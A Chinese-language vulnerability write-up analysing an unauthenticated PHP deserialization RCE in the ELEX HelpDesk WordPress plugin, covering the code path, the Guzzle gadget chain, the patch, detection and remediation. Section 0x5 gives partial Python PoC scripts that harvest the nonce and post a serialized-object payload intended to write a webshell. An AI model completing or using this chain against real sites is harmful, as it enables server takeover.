#  ELEX HelpDesk 前台 RCE 代码分析：工单表单里躺了六年的 PHP 反序列化  
原创 Kratos
                    Kratos  Kratos Sec   2026-11-15 10:56  
  
11 月 13 日，Wordfence 披露了 WordPress 官方插件目录在架插件 ELEX WordPress HelpDesk & Customer Ticketing System 的一个未授权 RCE，CVE-2026-119077，CVSS 9.8。这个插件是 ELEXtensions 出品的工单/客服系统，常和 WooCommerce 捆绑出现在电商站上——也就是说，漏洞入口是每个访客都能看到的"提交工单"表单。更值得琢磨的是，注入点 parse_str  
 + 原样入库的写法从插件早期版本就在，修复版本 3.4.0 的 changelog 只有一句 "Resolved a vulnerability issue"。  
  
这篇按老规矩讲清楚三件事：攻击链在代码里长什么样，为什么一个公开 nonce 挡不住任何东西，以及 3.4.0 到底修了哪几层。  
## 0x0 事件概述  
  
<table><thead><tr><th style="color: rgb(102, 102, 102);font-size: 16px;line-height: 1.5em;letter-spacing: 0em;text-align: left;font-weight: bold;background: none left top / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">项目</span></section></th><th style="color: rgb(102, 102, 102);font-size: 16px;line-height: 1.5em;letter-spacing: 0em;text-align: left;font-weight: bold;background: none left top / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">内容</span></section></th></tr></thead><tbody><tr style="color: rgb(102, 102, 102);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: left;background-position-y: top;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">编号</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">CVE-2026-119077（CWE-502，PHP 对象注入）</span></section></td></tr><tr style="color: rgb(102, 102, 102);background-attachment: scroll;background-clip: border-box;background-color: rgb(248, 248, 248);background-image: none;background-origin: padding-box;background-position-x: left;background-position-y: top;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">评分</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">CVSS 9.8（AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H）</span></section></td></tr><tr style="color: rgb(102, 102, 102);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: left;background-position-y: top;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">CNA / 发现者</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">Wordfence / Osman Hussein</span></section></td></tr><tr style="color: rgb(102, 102, 102);background-attachment: scroll;background-clip: border-box;background-color: rgb(248, 248, 248);background-image: none;background-origin: padding-box;background-position-x: left;background-position-y: top;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">影响</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">ELEX WordPress HelpDesk &amp; Customer Ticketing System ≤ 3.3.9</span></section></td></tr><tr style="color: rgb(102, 102, 102);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: left;background-position-y: top;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">修复</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">3.4.0（SVN changeset 3797458）</span></section></td></tr><tr style="color: rgb(102, 102, 102);background-attachment: scroll;background-clip: border-box;background-color: rgb(248, 248, 248);background-image: none;background-origin: padding-box;background-position-x: left;background-position-y: top;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">前提</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">站点存在 </span><code><span leaf="">[wsdesk_support]</span></code><span leaf=""> 短代码页面（即公开工单入口）；无需任何账号</span></section></td></tr></tbody></table>  
  
两个背景信息值得记下：一是 3.3.9 的 changelog 本身也是一条安全修复（factory reset 未授权任意文件删除），这个插件近两个版本连续在还安全债；二是整条利用链只需要"一次匿名 GET 拿 nonce + 一次匿名 POST"，对自动化扫描器来说成本极低。  
## 0x1 攻击面：注册给匿名用户的 AJAX 动作  
  
漏洞入口是 admin-ajax.php  
 上的一个动作注册：  
```
// includes/class-crm-init-handler.php:51
add_action( 'wp_ajax_eh_crm_new_ticket_post',        array( 'CRM_Ajax', 'eh_crm_new_ticket_post' ) );
add_action( 'wp_ajax_nopriv_eh_crm_new_ticket_post', array( 'CRM_Ajax', 'eh_crm_new_ticket_post' ) );

```  
  
nopriv  
 意味着未登录用户也能调用——这本身合理，工单系统本来就要让陌生访客提交请求。问题在 handler 的第一道也是唯一一道防线：  
```
// includes/class-crm-ajax-functions-two.php:153
if (wp_verify_nonce(isset($_POST['nonce']) ? sanitize_text_field($_POST['nonce']) : '', 'wsdesk_nonce')) {

```  
  
WordPress 的 nonce 不是一次性令牌，它的设计目标是"防 CSRF"而不是"防匿名获取"。这个 nonce 在哪生成？  
```
// includes/class-crm-js-translation.php:165
'nonce' => wp_create_nonce( 'wsdesk_nonce' ),

```  
  
它通过本地化脚本输出到前端。而短代码注册在 init-handler.php:179：add_shortcode( 'wsdesk_support', ... )  
。串起来就是：**任何渲染工单表单的公开页面，HTML/JS 里都带着一个对匿名访客有效的 wsdesk_nonce**  
，有效期 12–24 小时。攻击者匿名 GET 一次工单页面，正则抠出 nonce，"唯一防线"就归零了。  
## 0x2 注入点：form 字符串的键值对原样入库  
  
进门之后看数据流，三步。  
  
**第一步，parse_str 摊开 form。**  
 前端把整个表单 jQuery serialize 后塞在一个参数里提交，后端用 parse_str  
 摊开：  
```
// includes/class-crm-ajax-functions-two.php:156
$post_values = array();
parse_str(isset($post['form']) ? $post['form'] : '', $post_values);

```  
  
常规字段（request_email、request_title、request_description）会被显式取出并做 sanitize，内部键 ticket_tags  
、ticket_assignee  
 也在前面被程序赋了值——到这里为止都没毛病。  
  
**第二步，foreach 原样合并。**  
 出事的是收尾这一段：  
```
// includes/class-crm-ajax-functions-two.php:261-267
$default_label = eh_crm_get_settingsmeta('0', 'default_label');
if (eh_crm_get_settings(array('slug' => $default_label))) {
    $meta['ticket_label'] = $default_label;          // 先赋默认值
}
foreach ($post_values as $key => $value) {
    $meta[$key] = $value;                            // 再被攻击者的同名键覆盖
}

```  
  
注释都是多余的，代码自己会说话：表单里剩下的每一个键值对，**不经任何过滤**  
写进工单 meta。攻击者在 form 里带一个 ticket_label=O:...  
，就把程序刚赋好的默认 label 覆盖成了任意字符串。  
  
**第三步，字符串原样落库。**  
```
// includes/class-crm-public-functions.php  eh_crm_insert_ticketmeta
if ( is_array( $value ) ) {
    $data = serialize( $value );
} else {
    $data = $value;                                   // 字符串不过任何处理
}

```  
  
eh_crm_insert_ticket  
 对 meta 数组逐键调用 eh_crm_insert_ticketmeta  
，于是一段 PHP 序列化对象字符串就这样躺在 wsdesk_ticketsmeta  
 表里，等人来读。  
## 0x3 从对象注入到 RCE：读回触发 + 自带 gadget  
  
**sink 在工单 meta 的读取函数里。**  
```
// includes/class-crm-public-functions.php:810-827
function eh_crm_get_ticketmeta( $id, $key = null ) {
    ...
    if ( null !== $key ) {
        return maybe_unserialize( $data[0]['meta_value'] );     // 无 allowed_classes
    }
    for ( $i = 0; $i < count( $data ); $i++ ) {
        $retrived[ $data[$i]['meta_key'] ] = maybe_unserialize( $data[$i]['meta_value'] );
    }

```  
  
maybe_unserialize  
 的内部就是裸 unserialize  
。O:  
 开头的字符串能通过 is_serialized  
 检查，对象直接实例化——PHP 对象注入达成。  
  
**触发时机有两路。**  
 第一路就在同一个请求里：若站点开了新工单自动邮件，handler 收尾处直接读回 meta：  
```
// includes/class-crm-ajax-functions-two.php:275-281
$send = eh_crm_get_settingsmeta('0', 'auto_send_creation_email');
if ('enable' == $send) {
    $response = $repo->eh_crm_fire_email('new_ticket', $gen_id);
    // → class-crm-ajax-functions.php:946  eh_crm_get_ticketmeta($ticket_id)  ← sink
}

```  
  
提交工单的同一个 POST 里反序列化就发生了，攻击者连等待都不需要。第二路是被动触发：客服在后台打开工单列表或详情时同样会走 eh_crm_get_ticketmeta  
——存进去的"地雷"等管理员自己踩。  
  
**pop 链不用出插件目录。**  
 这个插件 vendor 里自带 Guzzle，CVE 引用直接指向了它：  
```
// vendor/guzzlehttp/guzzle/src/Cookie/FileCookieJar.php:45
public function __destruct(){
    $this->save($this->filename);
}

public function save(string $filename): void{
    $json = [];
    foreach ($this as $cookie) { ... $json[] = $cookie->toArray(); }
    $jsonStr = Utils::jsonEncode($json);
    if (false === \file_put_contents($filename, $jsonStr, \LOCK_EX)) {   // L68

```  
  
反序列化 GuzzleHttp\Cookie\FileCookieJar  
 对象，请求结束时 __destruct  
 自动触发，filename  
 和 cookie 内容都是对象属性、完全可控——经典的"析构任意文件写"。cookie 的 Value 经 json_encode 后拼进文件内容，PHP 标签外的 JSON 噪声解释器不理会，挑一个不含引号和斜杠的一句话形态就能落一个 webshell 到 Web 根目录，RCE 收尾。9.8 的三个 H（C/H/I:H/A:H）就是这么凑齐的。  
  
一条链总结成五行：  
```
匿名 GET [wsdesk_support] 页面 → 抠 wsdesk_nonce
匿名 POST admin-ajax.php (action=eh_crm_new_ticket_post)
  └ parse_str($form) → ticket_label = 序列化 FileCookieJar
  └ 原样入库 wsdesk_ticketsmeta
同请求/后台读回 → unserialize() → __destruct → file_put_contents → RCE

```  
## 0x4 3.4.0 修了什么：一次教科书式的三层收口  
  
diff 3.3.8 和 3.4.0，修复不只在 sink，而是每层都补了一刀。  
  
**入口检测。**parse_str  
 之后立刻整体体检：  
```
// 3.4.0  class-crm-ajax-functions-two.php:157
if ( eh_crm_has_object_or_serialized_object( $post_values ) ) {
    die( wp_json_encode( array( 'status' => 'error', 'message' => 'Invalid form data.' ) ) );
}

```  
  
新增的检测函数递归遍历，对字符串同时查空字节和对象序列化特征：  
```
// 3.4.0  class-crm-public-functions.php
if ( false !== strpos( $data, "\0" ) ) { return true; }
if ( preg_match( '/(^|;|{|\[)[OC]:\+?[0-9]+:"/i', $data ) ) { return true; }

```  
  
**内部键保护。**  
 合并前先 unset 掉 ticket_label  
、ticket_tags  
、ticket_assignee  
、ticket_attachment  
 等内部键，表单里的同名键不再有覆盖资格。  
  
**字段白名单。**  
 foreach 合并改成只收管理后台配置过的自定义字段 slug，且值本身不能是序列化字符串：  
```
if ( in_array( $key, $allowed_field_slugs, true ) && ... ) {
    if ( eh_crm_has_object_or_serialized_object( $value ) || is_serialized( $value ) ) { continue; }
    $meta[$key] = $value;
}

```  
  
**sink 兜底。**  
 读取侧新增 eh_crm_safe_unserialize  
，内部用 unserialize( $data, array( 'allowed_classes' => false ) )  
——即使前面全被绕过，对象也不会被实例化。  
  
从"入口检测 + 键保护 + 字段白名单 + sink 兜底"四层结构看，这次修复是认真做了威胁建模的，比 changelog 那句 "Resolved a vulnerability issue" 的信息量大多了。  
## 0x5 PoC  
  
**第一段，收割 nonce：**  
```
import re, requests

base = "https://target.tld"
r = requests.get(f"{base}/support/", timeout=10)   # 任何带 [wsdesk_support] 的页面
nonce = re.search(r'"nonce":"([0-9a-f]{10})"', r.text).group(1)

```  
  
**第二段，投递工单：**  
```
import urllib.parse

form_inner = "request_email=a@b.c&request_title=hi&request_description=hi"
payload    = build_object_injection_payload()   # 见下，此处刻意不完整
form = form_inner + "&ticket_label=" + urllib.parse.quote(payload, safe='')

requests.post(f"{base}/wp-admin/admin-ajax.php", data={
    "action": "eh_crm_new_ticket_post",
    "nonce":  nonce,
    "form":   form,
})

```  
  
注意一个实操细节：form  
 本身是 POST body 里的一个值，parse_str  
 又会做一次 URL 解码，所以序列化串里的 {  
、"  
、;  
 和空字节需要**两次编码**  
，这是复现时最常见的翻车点。  
  
**第三段，payload 构造。**  
 目标对象结构如下，filename  
 指向 Web 可写目录的落脚点；cookie 数组需要构造成能通过 shouldPersist  
 检查、且 Value 里携带一个不含 "  
 和 /  
 的短 payload 的 SetCookie  
 实例——这两块的具体拼装留给读者当练习，生产环境验证请用自己的测试站：  
```
O:31:"GuzzleHttp\Cookie\FileCookieJar":N:{
    filename:            "……/wp-content/uploads/……php"
    storeSessionCookies: true
    cookies:             [ SetCookie{ Value: "<?php …… ?>" } ]   // 细节略
}

```  
  
验证成功的标志不是页面回显，而是目标目录出现新文件、或后续对该文件的请求产生出网/执行痕迹。防御方视角看，工单标题正常入库、但站点 uploads  
 下多出可疑 php 文件，是最直白的落点。  
## 0x6 自查与处置  
  
**暴露面。**site:target "wsdesk_support"  
 或直接访问常见路径（/support/、/helpdesk/、含"Submit a ticket"的页面），页面源码出现 wsdesk_nonce  
 即确认插件在用且入口公开。资产侧用 wp plugin list  
 / Wappalyzer 指纹批量过一遍版本。  
  
**版本。**  
 ≤ 3.3.9 一律视为可被未授权 RCE——没有中间态，CVSS 9.8 的未授权链不值得讨价还价。  
  
**失陷痕迹。**  
 重点翻三处：wp_wsdesk_ticketsmeta  
 表里 meta_key='ticket_label'  
 且 meta_value LIKE 'O:%'  
 的记录（注入是否到达的直接证据）；uploads  
 及其他 Web 可写目录近期新增的 .php  
；admin-ajax.php  
 访问日志中 action=eh_crm_new_ticket_post  
 且 form 参数异常长的 POST。  
  
**处置。**  
 立即升 3.4.0；若短期升不了，临时用 WAF 拦 action=eh_crm_new_ticket_post  
 请求中 form  
 含 [OC]:\d+:"  
 特征的 POST；已被打过的站按 RCE 标准流程走——webshell 排查、后门账号、权限提升链取证，别只删文件了事。  
  
最后说句方法论：这个漏洞没有用到任何精妙 trick，parse_str  
 收任意键 + foreach  
 原样入库 + 裸 unserialize  
 读回，三行代码各自都"能跑"，拼起来就是 9.8。WordPress 插件审计里，"表单字段名与 meta 键名直接同名映射"这种写法值得单独建一个检查项——键名即攻击面。  
  
**参考**  
- https://nvd.nist.gov/vuln/detail/CVE-2026-119077  
  
- https://www.wordfence.com/threat-intel/vulnerabilities/search?query=CVE-2026-119077  
  
- https://plugins.svn.wordpress.org/elex-helpdesk-customer-support-ticket-system/tags/3.3.8/  
  
- https://plugins.svn.wordpress.org/elex-helpdesk-customer-support-ticket-system/tags/3.4.0/  
  
- https://plugins.trac.wordpress.org/changeset/3797458/  
  
**免责声明**  
：本文仅用于安全研究与学习，请勿用于未授权测试。  
  
  
